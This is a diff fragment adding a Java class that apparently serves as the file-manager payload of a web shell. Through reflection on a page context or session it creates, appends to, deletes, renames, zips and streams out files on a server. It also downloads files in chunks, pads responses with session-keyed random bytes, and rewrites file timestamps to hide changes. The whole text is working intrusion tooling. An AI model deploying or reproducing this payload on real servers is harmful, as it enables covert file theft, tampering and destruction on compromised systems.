+            result.put("status", "fail");
+            result.put("msg", "重命名失败:" + newPath);
+        }
+        return result;
+    }
+
+    private String createFile() throws Exception {
+        FileOutputStream fso = new FileOutputStream(path);
+        fso.close();
+        String result = path + "创建完成";
+        return result;
+    }
+
+    private String createDirectory() throws Exception {
+        File dir = new File(path);
+        dir.mkdirs();
+        String result = path + "创建完成";
+        return result;
+    }
+
+    private void download() throws Exception {
+        FileInputStream fis = new FileInputStream(path);
+        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
+        Method write = so.getClass().getMethod("write", byte[].class);
+        while (true) {
+            int data = fis.read();
+            if (data != -1) {
+                write.invoke(so, Integer.valueOf(data));
+            } else {
+                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
+                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
+                fis.close();
+                return;
+            }
+        }
+    }
+
+    private String append() throws Exception {
+        FileOutputStream fso = new FileOutputStream(path, true);
+        fso.write(base64decode(content));
+        fso.flush();
+        fso.close();
+        String result = path + "追加完成，远程文件大小:" + new File(path).length();
+        return result;
+    }
+
+    private Map<String, String> delete() throws Exception {
+        Map<String, String> result = new HashMap<>();
+        File f = new File(path);
+        if (f.exists()) {
+            if (f.delete()) {
+                result.put("status", "success");
+                result.put("msg", path + " 删除成功.");
+            } else {
+                result.put("status", "fail");
+                result.put("msg", "文件" + path + "存在，但是删除失败.");
+            }
+        } else {
+            result.put("status", "fail");
+            result.put("msg", "文件不存在.");
+        }
+        return result;
+    }
+
+    private String getTimeStamp() throws Exception {
+        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
+        File f = new File(path);
+        Map<String, String> timeStampObj = new HashMap<>();
+        if (f.exists()) {
+            getClass();
+            Class<?> cls = Class.forName("java.nio.file.Files");
+            getClass();
+            Class<?> cls2 = Class.forName("java.nio.file.attribute.BasicFileAttributes");
+            getClass();
+            Class<?> cls3 = Class.forName("java.nio.file.Paths");
+            Object file = cls3.getMethod("get", String.class, String[].class).invoke(cls3.getClass(), path, new String[0]);
+            Object attrs = cls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(cls, file, cls2, new LinkOption[0]);
+            Class<?> cls4 = Class.forName("java.nio.file.attribute.FileTime");
+            Object createTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("creationTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
+            Object lastAccessTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("lastAccessTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
+            Object lastModifiedTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("lastModifiedTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
+            String createTimeStamp2 = df.format(new Date(((Long) createTime).longValue()));
+            String lastAccessTimeStamp = df.format(new Date(((Long) lastAccessTime).longValue()));
+            String lastModifiedTimeStamp = df.format(new Date(((Long) lastModifiedTime).longValue()));
+            timeStampObj.put("createTime", createTimeStamp2);
+            timeStampObj.put("lastAccessTime", lastAccessTimeStamp);
+            timeStampObj.put("lastModifiedTime", lastModifiedTimeStamp);
+            String result = buildJson(timeStampObj, true);
+            return result;
+        }
+        throw new Exception("文件不存在");
+    }
+
+    private boolean isWindows() {
+        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
+            return true;
+        }
+        return false;
+    }
+
+    private String updateTimeStamp() throws Exception {
+        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
+        File f = new File(path);
+        if (f.exists()) {
+            f.setLastModified(df.parse(modifyTimeStamp).getTime());
+            if (!isOldJava()) {
+                Class<?> cls = Class.forName("java.nio.file.Paths");
+                Class<?> cls2 = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
+                Class<?> cls3 = Class.forName("java.nio.file.attribute.FileTime");
+                Method getFileAttributeView = Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", Path.class, Class.class, LinkOption[].class);
+                Object attributes = getFileAttributeView.invoke(Class.forName("java.nio.file.Files"), cls.getMethod("get", String.class, String[].class).invoke(cls.getClass(), path, new String[0]), cls2, new LinkOption[0]);
+                Object createTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(createTimeStamp).getTime()));
+                Object accessTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(accessTimeStamp).getTime()));
+                Object modifyTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(modifyTimeStamp).getTime()));
+                cls2.getMethod("setTimes", cls3, cls3, cls3).invoke(attributes, modifyTime, accessTime, createTime);
+            }
+            return "时间戳修改成功。";
+        }
+        throw new Exception("文件不存在");
+    }
+
+    private String downloadPart(String path2, long blockIndex2, long blockSize2) throws Exception {
+        int size;
+        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path2);
+        if (ch == null) {
+            FileInputStream fis = new FileInputStream(path2);
+            ch = fis.getChannel();
+            sessionSetAttribute(this.Session, "fis", fis);
+            sessionSetAttribute(this.Session, path2, ch);
+        }
+        ByteBuffer buffer = ByteBuffer.allocate((int) blockSize2);
+        synchronized (ch) {
+            ch.position(blockIndex2 * blockSize2);
+            size = ch.read(buffer);
+        }
+        byte[] content2 = new byte[size];
+        System.arraycopy(buffer.array(), 0, content2, 0, size);
+        return base64encode(content2);
+    }
+
+    private static void zipFile(String srcDir, boolean KeepDirStructure) throws Exception {
+        File file = new File(srcDir);
+        String fileName = file.getName();
+        FileOutputStream out = new FileOutputStream(new File(srcDir).getParentFile().getAbsolutePath() + File.separator + fileName + ".zip");
+        System.currentTimeMillis();
+        ZipOutputStream zos = null;
+        try {
+            try {
+                zos = new ZipOutputStream(out);
+                File sourceFile = new File(srcDir);
+                compress(sourceFile, zos, sourceFile.getName(), KeepDirStructure);
+                System.currentTimeMillis();
+                if (zos != null) {
+                    try {
+                        zos.close();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
+            } catch (Exception e2) {
+                throw new RuntimeException("zip error from ZipUtils", e2);
+            }
+        } catch (Throwable th) {
+            if (zos != null) {
+                try {
+                    zos.close();
+                } catch (IOException e3) {
+                    e3.printStackTrace();
+                }
+            }
+            throw th;
+        }
+    }
+
+    private static void compress(File sourceFile, ZipOutputStream zos, String name, boolean KeepDirStructure) throws Exception {
+        byte[] buf = new byte[102400];
+        if (sourceFile.isFile()) {
+            zos.putNextEntry(new ZipEntry(name));
+            FileInputStream in = new FileInputStream(sourceFile);
+            while (true) {
+                int len = in.read(buf);
+                if (len != -1) {
+                    zos.write(buf, 0, len);
+                } else {
+                    zos.closeEntry();
+                    in.close();
+                    return;
+                }
+            }
+        } else {
+            File[] listFiles = sourceFile.listFiles();
+            if (listFiles == null || listFiles.length == 0) {
+                if (KeepDirStructure) {
+                    zos.putNextEntry(new ZipEntry(name + "/"));
+                    zos.closeEntry();
+                    return;
+                }
+                return;
+            }
+            for (File file : listFiles) {
+                if (KeepDirStructure) {
+                    compress(file, zos, name + "/" + file.getName(), KeepDirStructure);
+                } else {
+                    compress(file, zos, file.getName(), KeepDirStructure);
+                }
+            }
+        }
+    }
+
+    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
+        StringBuilder sb = new StringBuilder();
+        sb.append("[");
+        for (Map<String, String> entity : list) {
+            sb.append(buildJson(entity, encode) + ",");
+        }
+        if (sb.toString().endsWith(",")) {
+            sb.setLength(sb.length() - 1);
+        }
+        sb.append("]");
+        return sb.toString();
+    }
+
+    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
+        StringBuilder sb = new StringBuilder();
+        String version = System.getProperty("java.version");
+        sb.append("{");
+        for (String key : entity.keySet()) {
+            sb.append("\"" + key + "\":\"");
+            String value = entity.get(key).toString();
+            if (encode) {
+                if (version.compareTo("1.9") >= 0) {
+                    getClass();
+                    Class<?> cls = Class.forName("java.util.Base64");
+                    Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
+                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
+                } else {
+                    getClass();
+                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
+                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
+                }
+            }
+            sb.append(value);
+            sb.append("\",");
+        }
+        if (sb.toString().endsWith(",")) {
+            sb.setLength(sb.length() - 1);
+        }
+        sb.append("}");
+        return sb.toString();
+    }
+
+    private byte[] base64decode(String base64Text) throws Exception {
+        byte[] result;
+        String version = System.getProperty("java.version");
+        if (version.compareTo("1.9") >= 0) {
+            getClass();
+            Class<?> cls = Class.forName("java.util.Base64");
+            Object Decoder = cls.getMethod("getDecoder", null).invoke(cls, null);
+            result = (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
+        } else {
+            getClass();
+            Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
+            result = (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
+        }
+        return result;
+    }
+
+    private static String base64encode(String content2) throws Exception {
+        String result;
+        String version = System.getProperty("java.version");
+        if (version.compareTo("1.9") >= 0) {
+            Class<?> cls = Class.forName("java.util.Base64");
+            Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
+            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content2.getBytes("UTF-8"));
+        } else {
+            Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
+            String result2 = (String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, content2.getBytes("UTF-8"));
+            result = result2.replace("\n", "").replace("\r", "");
+        }
+        return result;
+    }
+
+    private static String base64encode(byte[] content2) throws Exception {
+        String result;
+        String version = System.getProperty("java.version");
+        if (version.compareTo("1.9") >= 0) {
+            Class<?> cls = Class.forName("java.util.Base64");
+            Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
+            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content2);
+        } else {
+            Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
+            String result2 = (String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, content2);
+            result = result2.replace("\n", "").replace("\r", "");
+        }
+        return result;
+    }
+
+    private void fillContext(Object obj) throws Exception {
+        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
+            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
+            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
+        } else {
+            Map<String, Object> objMap = (Map) obj;
+            this.Session = objMap.get("session");
+            this.Response = objMap.get("response");
+            this.Request = objMap.get("request");
+        }
+        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+    }
+
+    private byte[] getMagic() throws Exception {
+        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+        Random random = new Random();
+        byte[] buf = new byte[magicNum];
+        for (int i = 0; i < buf.length; i++) {
+            buf[i] = (byte) random.nextInt(256);
+        }
+        return buf;
+    }
+
+    private Object sessionGetAttribute(Object session, String key) {
+        Object result = null;
+        try {
+            result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
+        } catch (Exception e) {
+        }
+        return result;
+    }
+
+    private void sessionSetAttribute(Object session, String key, Object value) {
+        try {
+            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+        } catch (Exception e) {
+        }
+    }
+}
